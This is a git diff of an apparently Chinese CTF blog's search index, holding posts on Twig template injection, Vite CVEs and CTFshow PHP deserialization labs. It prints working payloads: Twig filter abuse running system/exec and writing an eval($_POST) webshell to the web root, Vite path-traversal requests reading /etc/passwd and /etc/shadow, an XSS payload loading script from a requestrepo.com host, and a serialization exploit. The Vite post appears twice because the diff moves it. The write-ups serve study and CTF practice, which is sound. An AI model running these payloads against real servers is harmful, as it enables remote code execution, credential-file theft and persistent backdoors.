+<pre><code class="highlight plaintext">&#123;&#123;[&quot;phpinfo();&quot;]|map(&quot;assert&quot;)|join(&quot;,&quot;)&#125;&#125;
+&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;    // 写 Webshell</code></pre>
+
+<p><strong>sort</strong></p>
+<p>这个 <code>sort</code> 筛选器可以用来对数组排序。</p>
+<pre><code class="highlight plaintext">&#123;% for user in users|sort %&#125;
+    ...
+&#123;% endfor %&#125;</code></pre>
+
+<p>可以传递一个箭头函数来配置排序</p>
+<pre><code class="highlight plaintext">&#123;% set fruits = [
+    &#123;name: &#x27;Apples&#x27;, quantity: 5&#125;,
+    &#123;name: &#x27;Oranges&#x27;, quantity: 2&#125;,
+    &#123;name: &#x27;Grapes&#x27;, quantity: 4&#125;,
+] %&#125;
+
+&#123;% for fruit in fruits|sort((a, b) =&gt; a.quantity &lt;=&gt; b.quantity)|column(&#x27;name&#x27;) %&#125;
+    &#123;&#123; fruit &#125;&#125;
+&#123;% endfor %&#125;
+
+&#123;# output in this order: Oranges, Grapes, Apples #&#125;</code></pre>
+
+<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_sort_filter</code> 函数，这个 <code>twig_sort_filter</code> 函数的源码如下：</p>
+<pre><code class="highlight plaintext">function twig_sort_filter($array, $arrow = null)
+&#123;
+    if ($array instanceof \Traversable) &#123;
+        $array = iterator_to_array($array);
+    &#125; elseif (!\is_array($array)) &#123;
+        throw new RuntimeError(sprintf(&#x27;The sort filter only works with arrays or &quot;Traversable&quot;, got &quot;%s&quot;.&#x27;, \gettype($array)));
+    &#125;
+
+    if (null !== $arrow) &#123;
+        uasort($array, $arrow);    // 直接被 uasort 调用 
+    &#125; else &#123;
+        asort($array);
+    &#125;
+
+    return $array;
+&#125;</code></pre>
+
+<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>uasort</code> 函数调用。众所周知 <code>uasort</code> 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：</p>
+<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;,0];
+php &gt; usort($arr,&quot;system&quot;);
+uid=0(root) gid=0(root) groups=0(root)
+php &gt;</code></pre>
+
+<p>知道了做这些我们便可以构造 Payload 了：</p>
+<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>
+
+<p><strong>filter</strong></p>
+<p>这个 <code>filter</code> 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：</p>
+<pre><code class="highlight plaintext">&#123;% set lists = [34, 36, 38, 40, 42] %&#125;
+&#123;&#123; lists|filter(v =&gt; v &gt; 38)|join(&#x27;, &#x27;) &#125;&#125;
+
+// Output: 40, 42</code></pre>
+
+<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_array_filter</code> 函数，这个 <code>twig_array_filter</code> 函数的源码如下：</p>
+<pre><code class="highlight plaintext">function twig_array_filter($array, $arrow)
+&#123;
+    if (\is_array($array)) &#123;
+        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
+    &#125;
+
+    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
+    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
+&#125;</code></pre>
+
+<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>array_filter</code> 函数调用。 <code>array_filter</code> 函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：</p>
+<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;];
+php &gt; array_filter($arr,&quot;system&quot;);
+uid=0(root) gid=0(root) groups=0(root)
+php &gt;</code></pre>
+
+<pre><code class="highlight plaintext">poc:
+&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;]|filter(&quot;passthru&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;]|filter(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>
+
+
+
+<p><strong>reduce</strong></p>
+<p>这个 <code>reduce</code> 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：</p>
+<pre><code class="highlight plaintext">&#123;% set numbers = [1, 2, 3] %&#125;
+&#123;&#123; numbers|reduce((carry, v) =&gt; carry + v) &#125;&#125;
+// Output: 6</code></pre>
+
+<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_array_reduce</code> 函数，这个 <code>twig_array_reduce</code> 函数的源码如下：</p>
+<pre><code class="highlight plaintext">function twig_array_reduce($array, $arrow, $initial = null)
+&#123;
+    if (!\is_array($array)) &#123;
+        $array = iterator_to_array($array);
+    &#125;
+
+    return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
+&#125;</code></pre>
+
+<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>array_filter</code> 函数调用。 <code>array_reduce</code> 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。</p>
+<p>直接给出 Payload：</p>
+<pre><code class="highlight plaintext">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;id&quot;)&#125;&#125;
+&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;id&quot;)&#125;&#125;
+&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;id&quot;)&#125;&#125;    // 无回显</code></pre>
+
+]]></content>
       <tags>
         <tag>-CTF -Web</tag>
       </tags>
@@ -4120,73 +4569,6 @@ black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">
       </tags>
   </entry>
   <entry>
-    <title>Vite相关CVE</title>
-    <url>/2025/04/16/Vite%E7%9B%B8%E5%85%B3CVE/</url>
-    <content><![CDATA[<h1 id="Vite相关CVE"><a href="#Vite相关CVE" class="headerlink" title="Vite相关CVE"></a>Vite相关CVE</h1><p>TG遇到了Vite这个东西，出了三个前端的cve题目，都是很新鲜的cve，因此想着了解一下Vite相关的cve，复现可能要等后面学了ts再看了唉唉。。</p>
-<h2 id="CVE-2022-35204"><a href="#CVE-2022-35204" class="headerlink" title="CVE-2022-35204"></a>CVE-2022-35204</h2><p>Vite的一个任意文件读取漏洞</p>
-<p>vite 默认启用的 <code>/@fs/</code> 路由用于访问任意本地文件</p>
-<p>但是正常访问是会被block的</p>
-<p>但是可以利用<code>../</code>绕过进行任意文件读</p>
-<p>目前还未复现，贴上别的师傅打好的poc</p>
-<pre><code class="highlight plaintext">curl --path-as-is http://localhost:3000/@fs/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts
-//原链接 https://blog.sww.moe/post/exploits/cve-2022-35204/</code></pre>
-
-<p>这个漏洞的成因大概就是decodeURI这个函数的漏洞</p>
-<pre><code class="highlight plaintext">decodeURI在解码时会将大部分的ASCII标点符号和预留字符保留不变，包括/和%2f
-这样就会导致/../未被检测到而绕过了安全检测
-传入的/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts 的时候，decodeURI 函数解析出来的结果会保留其中的所有 %2f，再经由下一步的 path.resolve 函数解析，最终结果是 /home/swwind/tmp/cve/CVE-2022-35204/..%2f..%2f..%2f..%2f../etc/hosts，由此非常轻松地就绕过了 vite 的允许目录检查。</code></pre>
-
-<p>相比之下，decodeURIcomponent就要好一些，因为其解码 URI 组件中的字符，而不是完整的 URI。它可以正确解码任何 ASCII 字符或 UTF-8 字符集，包括默认 URI 编码中使用的所有预留字符和其他特殊字符</p>
-<p>在decodeURIcomponent的处理后，传入的参数被解析为<code>/home/swwind/tmp/cve/CVE-2022-35204/../../../../../etc/hosts</code>，会被正确过滤为<code>/etc/hosts</code>，从而防御了任意文件读取</p>
-<h2 id="CVE-2023-49293"><a href="#CVE-2023-49293" class="headerlink" title="CVE-2023-49293"></a>CVE-2023-49293</h2><p>Vite的一个XSS漏洞</p>
-<p>复现可能要回头了把<a href="https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97">XSS vulnerability in <code>server.transformIndexHtml</code> via URL payload · Advisory · vitejs&#x2F;vite · GitHub</a></p>
-<p>poc就是直接在后面query打一个普通的反射xss语句，直接弹</p>
-<pre><code class="highlight plaintext">?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E
-//?&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&#x27;boom&#x27;)&lt;/script&gt;</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416124525018.png" alt="image-20250416124525018"></p>
-<p>再尝试构造弹了一下</p>
-<pre><code class="highlight plaintext">?&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://71g9hx8u.requestrepo.com/&quot;;&gt; &lt; /script&gt;</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416125624323.png" alt="image-20250416125624323"></p>
-<h2 id="CVE-2025-30208"><a href="#CVE-2025-30208" class="headerlink" title="CVE-2025-30208"></a>CVE-2025-30208</h2><p>还是相同的<code>@fs</code>的利用</p>
-<p>这边贴poc，回头会补复现</p>
-<pre><code class="highlight plaintext">/@fs/etc/passwd?import&amp;raw??
-/@fs/etc/passwd?raw??</code></pre>
-
-<p><a href="https://www.xaitx.com/tech/2025-03-26.html">Vite 任意文件读取漏洞分析复现（CVE-2025-30208） | 小艾博客</a></p>
-<h2 id="CVE-2025-31125"><a href="#CVE-2025-31125" class="headerlink" title="CVE-2025-31125"></a>CVE-2025-31125</h2><p>这个洞是利用inline的规则配合.wsam进行绕过(是对上一个CVE的补丁的绕过)</p>
-<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init
-还有两个下面那个大佬打出来的未公开poc//适用6.2.4
-/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init
-/@fs/etc/shadow?meteorkai.svg?.wasm?init  //这里没有import是因为读取的文件没有后缀，isJSRequest为true</code></pre>
-
-<p>这边引用一下大佬的解释好了</p>
-<pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：
-将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求
-?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持
-通过这种新的方法绕过了修复后的正则过滤
-//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>
-
-<p><a href="https://xz.aliyun.com/news/17655">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区</a></p>
-<h2 id="CVE-2025-31486"><a href="#CVE-2025-31486" class="headerlink" title="CVE-2025-31486"></a>CVE-2025-31486</h2><p>先贴出poc</p>
-<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init
-/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw</code></pre>
-
-<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">原链</a></p>
-<p>其中第二个poc是需要先探出大概的路径才能打的</p>
-<p><a href="https://xz.aliyun.com/news/17730">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31486）-先知社区</a></p>
-<h2 id="CVE-2025-32395"><a href="#CVE-2025-32395" class="headerlink" title="CVE-2025-32395"></a>CVE-2025-32395</h2><p>poc</p>
-<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173</code></pre>
-
-<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4">原链</a></p>
-<p><a href="https://xz.aliyun.com/news/17745">Vite任意文件读取bypass调试分析（CVE-2025-32395）-先知社区</a></p>
-]]></content>
-      <tags>
-        <tag>-CVE -Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VNCTF2025</title>
     <url>/2025/02/10/VNCTF2025/</url>
     <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
@@ -4306,6 +4688,73 @@ if __name__ == &quot;__main__&quot;:
 ]]></content>
       <tags>
         <tag>-CTF -Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vite相关CVE</title>
+    <url>/2025/04/16/Vite%E7%9B%B8%E5%85%B3CVE/</url>
+    <content><![CDATA[<h1 id="Vite相关CVE"><a href="#Vite相关CVE" class="headerlink" title="Vite相关CVE"></a>Vite相关CVE</h1><p>TG遇到了Vite这个东西，出了三个前端的cve题目，都是很新鲜的cve，因此想着了解一下Vite相关的cve，复现可能要等后面学了ts再看了唉唉。。</p>
+<h2 id="CVE-2022-35204"><a href="#CVE-2022-35204" class="headerlink" title="CVE-2022-35204"></a>CVE-2022-35204</h2><p>Vite的一个任意文件读取漏洞</p>
+<p>vite 默认启用的 <code>/@fs/</code> 路由用于访问任意本地文件</p>
+<p>但是正常访问是会被block的</p>
+<p>但是可以利用<code>../</code>绕过进行任意文件读</p>
+<p>目前还未复现，贴上别的师傅打好的poc</p>
+<pre><code class="highlight plaintext">curl --path-as-is http://localhost:3000/@fs/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts
+//原链接 https://blog.sww.moe/post/exploits/cve-2022-35204/</code></pre>
+
+<p>这个漏洞的成因大概就是decodeURI这个函数的漏洞</p>
+<pre><code class="highlight plaintext">decodeURI在解码时会将大部分的ASCII标点符号和预留字符保留不变，包括/和%2f
+这样就会导致/../未被检测到而绕过了安全检测
+传入的/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts 的时候，decodeURI 函数解析出来的结果会保留其中的所有 %2f，再经由下一步的 path.resolve 函数解析，最终结果是 /home/swwind/tmp/cve/CVE-2022-35204/..%2f..%2f..%2f..%2f../etc/hosts，由此非常轻松地就绕过了 vite 的允许目录检查。</code></pre>
+
+<p>相比之下，decodeURIcomponent就要好一些，因为其解码 URI 组件中的字符，而不是完整的 URI。它可以正确解码任何 ASCII 字符或 UTF-8 字符集，包括默认 URI 编码中使用的所有预留字符和其他特殊字符</p>
+<p>在decodeURIcomponent的处理后，传入的参数被解析为<code>/home/swwind/tmp/cve/CVE-2022-35204/../../../../../etc/hosts</code>，会被正确过滤为<code>/etc/hosts</code>，从而防御了任意文件读取</p>
+<h2 id="CVE-2023-49293"><a href="#CVE-2023-49293" class="headerlink" title="CVE-2023-49293"></a>CVE-2023-49293</h2><p>Vite的一个XSS漏洞</p>
+<p>复现可能要回头了把<a href="https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97">XSS vulnerability in <code>server.transformIndexHtml</code> via URL payload · Advisory · vitejs&#x2F;vite · GitHub</a></p>
+<p>poc就是直接在后面query打一个普通的反射xss语句，直接弹</p>
+<pre><code class="highlight plaintext">?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E
+//?&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&#x27;boom&#x27;)&lt;/script&gt;</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416124525018.png" alt="image-20250416124525018"></p>
+<p>再尝试构造弹了一下</p>
+<pre><code class="highlight plaintext">?&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://71g9hx8u.requestrepo.com/&quot;;&gt; &lt; /script&gt;</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416125624323.png" alt="image-20250416125624323"></p>
+<h2 id="CVE-2025-30208"><a href="#CVE-2025-30208" class="headerlink" title="CVE-2025-30208"></a>CVE-2025-30208</h2><p>还是相同的<code>@fs</code>的利用</p>
+<p>这边贴poc，回头会补复现</p>
+<pre><code class="highlight plaintext">/@fs/etc/passwd?import&amp;raw??
+/@fs/etc/passwd?raw??</code></pre>
+
+<p><a href="https://www.xaitx.com/tech/2025-03-26.html">Vite 任意文件读取漏洞分析复现（CVE-2025-30208） | 小艾博客</a></p>
+<h2 id="CVE-2025-31125"><a href="#CVE-2025-31125" class="headerlink" title="CVE-2025-31125"></a>CVE-2025-31125</h2><p>这个洞是利用inline的规则配合.wsam进行绕过(是对上一个CVE的补丁的绕过)</p>
+<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init
+还有两个下面那个大佬打出来的未公开poc//适用6.2.4
+/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init
+/@fs/etc/shadow?meteorkai.svg?.wasm?init  //这里没有import是因为读取的文件没有后缀，isJSRequest为true</code></pre>
+
+<p>这边引用一下大佬的解释好了</p>
+<pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：
+将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求
+?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持
+通过这种新的方法绕过了修复后的正则过滤
+//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>
+
+<p><a href="https://xz.aliyun.com/news/17655">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区</a></p>
+<h2 id="CVE-2025-31486"><a href="#CVE-2025-31486" class="headerlink" title="CVE-2025-31486"></a>CVE-2025-31486</h2><p>先贴出poc</p>
+<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init
+/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw</code></pre>
+
+<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">原链</a></p>
+<p>其中第二个poc是需要先探出大概的路径才能打的</p>
+<p><a href="https://xz.aliyun.com/news/17730">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31486）-先知社区</a></p>
+<h2 id="CVE-2025-32395"><a href="#CVE-2025-32395" class="headerlink" title="CVE-2025-32395"></a>CVE-2025-32395</h2><p>poc</p>
+<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173</code></pre>
+
+<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4">原链</a></p>
+<p><a href="https://xz.aliyun.com/news/17745">Vite任意文件读取bypass调试分析（CVE-2025-32395）-先知社区</a></p>
+]]></content>
+      <tags>
+        <tag>-CVE -Web</tag>
       </tags>
   </entry>
   <entry>
@@ -5707,6 +6156,543 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
 <p>无数字字母rce</p>
 <p><code>~ $</code>不给用，自增取反异或都用不了辣</p>
 <p>不异或能怎么办呢。。你看这里是不是还有个<code>|</code>可以用</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
+
+<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>
+<span class="class"></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">false</span>;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
+    &#125;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="variable">$u</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="variable">$p</span>) &#123;
+            <span class="variable language_">$this</span>-&gt;isVip = <span class="literal">true</span>;
+        &#125;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
+    &#125;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>
+<span class="function">    </span>&#123;
+        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;isVip) &#123;
+            <span class="keyword">global</span> <span class="variable">$flag</span>;
+            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span> . <span class="variable">$flag</span>;
+        &#125; <span class="keyword">else</span> &#123;
+            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
+        &#125;
+    &#125;
+&#125;
+
+<span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
+<span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
+
+<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)) &#123;
+    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();
+    <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;
+        <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>()) &#123;
+            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
+        &#125;
+    &#125; <span class="keyword">else</span> &#123;
+        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>就是简单的传。别想歪了(谁想歪了我不说)</p>
+<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
+<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
+    &#125;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
+    &#125;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;
+            <span class="keyword">global</span> <span class="variable">$flag</span>;
+            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;
+        &#125;<span class="keyword">else</span>&#123;
+            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
+        &#125;
+    &#125;
+&#125;
+<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
+<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
+<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
+    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    
+    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;
+        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;
+            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
+        &#125;
+    &#125;<span class="keyword">else</span>&#123;
+        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>不帮你创，让你自己搞一搞，序列化入门说是</p>
+<pre><code class="highlight plaintext">&lt;?php
+class ctfShowUser&#123;
+    public $username=&#x27;1&#x27;;
+    public $password=&#x27;1&#x27;;
+    public $isVip=true;
+&#125;
+$A=new ctfShowUser();
+echo serialize($A);</code></pre>
+
+<p>发现传不进去，一查发现<strong>Cookie中将”作为截断符号</strong></p>
+<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250710161829381.png" alt="image-20250710161829381"></p>
+<p>感觉分号也不是很友好啊。<code>url编码整一个</code></p>
+<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
+
+<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
+    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
+    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
+
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
+    &#125;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
+        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
+    &#125;
+    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;
+        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;
+            <span class="keyword">global</span> <span class="variable">$flag</span>;
+            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;
+                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;
+              &#125;
+        &#125;<span class="keyword">else</span>&#123;
+            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
+        &#125;
+    &#125;
+&#125;
+
+<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
+<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
+
+<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
+    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    
+    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;
+        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;
+            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
+        &#125;
+    &#125;<span class="keyword">else</span>&#123;
